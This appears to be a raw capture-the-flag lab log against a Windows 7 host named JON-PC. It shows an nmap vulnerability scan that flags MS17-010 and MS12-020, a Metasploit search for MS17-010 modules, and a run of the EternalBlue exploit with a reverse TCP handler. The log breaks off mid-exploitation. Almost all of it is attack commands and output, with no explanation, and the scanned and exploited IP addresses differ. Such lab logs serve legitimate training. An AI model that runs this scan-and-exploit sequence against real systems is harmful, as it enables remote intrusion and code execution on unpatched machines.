# 10.201.77.101

# nmap

oot@ip-10-201-111-150:~# nmap -sV -sC --script vuln -Pn -oN nmap.txt 10.201.77.101 --open
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-16 01:51 BST
mass*dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.201.77.101
Host is up (0.00047s latency).
Not shown: 911 closed ports, 80 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp open tcpwrapped
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020:
| VULNERABLE:
| MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
| State: VULNERABLE
| IDs: CVE:CVE-2012-0152
| Risk factor: Medium CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
| Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|  
| Disclosure date: 2012-03-13
| References:
| http://technet.microsoft.com/en-us/security/bulletin/ms12-020
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|  
| MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
| State: VULNERABLE
| IDs: CVE:CVE-2012-0002
| Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
| Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|  
| Disclosure date: 2012-03-13
| References:
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|* http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|\_ssl-ccs-injection: No reply from server (TIMEOUT)
|\_sslv2-drown:
49152/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
49160/tcp open msrpc Microsoft Windows RPC
|\_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 16:FF:D6:BB:07:01 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|\_smb-vuln-ms10-054: false
|\_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
| VULNERABLE:
| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
| State: VULNERABLE
| IDs: CVE:CVE-2017-0143
| Risk factor: HIGH
| A critical remote code execution vulnerability exists in Microsoft SMBv1
| servers (ms17-010).
|  
| Disclosure date: 2017-03-14
| References:
| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.66 seconds

# msfconsole

# msf > search ms17-010

0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
1 \_ target: Automatic Target . . . .
2 \_ target: Windows 7 . . . .
3 \_ target: Windows Embedded Standard 7 . . . .
4 \_ target: Windows Server 2008 R2 . . . .
5 \_ target: Windows 8 . . . .
6 \_ target: Windows 8.1 . . . .
7 \_ target: Windows Server 2012 . . . .
8 \_ target: Windows 10 Pro . . . .
9 \_ target: Windows 10 Enterprise Evaluation . . . .
10 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
11 \_ target: Automatic . . . .
12 \_ target: PowerShell . . . .
13 \_ target: Native upload . . . .
14 \_ target: MOF upload . . . .
15 \_ AKA: ETERNALSYNERGY . . . .
16 \_ AKA: ETERNALROMANCE . . . .
17 \_ AKA: ETERNALCHAMPION . . . .
18 \_ AKA: ETERNALBLUE . . . .
19 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
20 \_ AKA: ETERNALSYNERGY . . . .
21 \_ AKA: ETERNALROMANCE . . . .
22 \_ AKA: ETERNALCHAMPION . . . .
23 \_ AKA: ETERNALBLUE . . . .
24 auxiliary/scanner/smb/smb_ms17_010 . normal No MS17-010 SMB RCE Detection
25 \_ AKA: DOUBLEPULSAR . . . .
26 \_ AKA: ETERNALBLUE . . . .
27 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution
28 \_ target: Execute payload (x64) . . . .
29 \_ target: Neutralize implant . . . .

Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

# set RHOSTS 10.201.46.32

# msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.201.16.245:4444
[*] 10.201.46.32:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.201.46.32:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.201.46.32:445 - Scanned 1 of 1 hosts (100% complete)
[+] 10.201.46.32:445 - The target is vulnerable.
[*] 10.201.46.32:445 - Connecting to target for exploitation.
[+] 10.201.46.32:445 - Connection established for exploitation.
[+] 10.201.46.32:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.46.32:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.46.32:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes
[*] 10.201.46.32:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv
[*] 10.201.46.32:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1  
[+] 10.201.46.32:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.46.32:445 - Trying exploit with 12 Groom Allocations.
[*] 10.201.46.32:445 - Sending all but last fragment of exploit packet
[*] 10.201.46.32:445 - Starting non-paged pool grooming
[+] 10.201.46.32:445 - Sending SMBv2 buffers
[+] 10.201.46.32:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.46.32:445 - Sending final SMBv2 buffers.
[*] 10.201.46.32:445 - Sending last fragment of exploit packet!
[*] 10.201.46.32:445 - Receiving response from exploit packet
[+] 10.201.46.32:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.46.32:445 - Sending egg to corrupted connection.
[*] 10.201.46.32:445 - Triggering free of corrupted buffer.
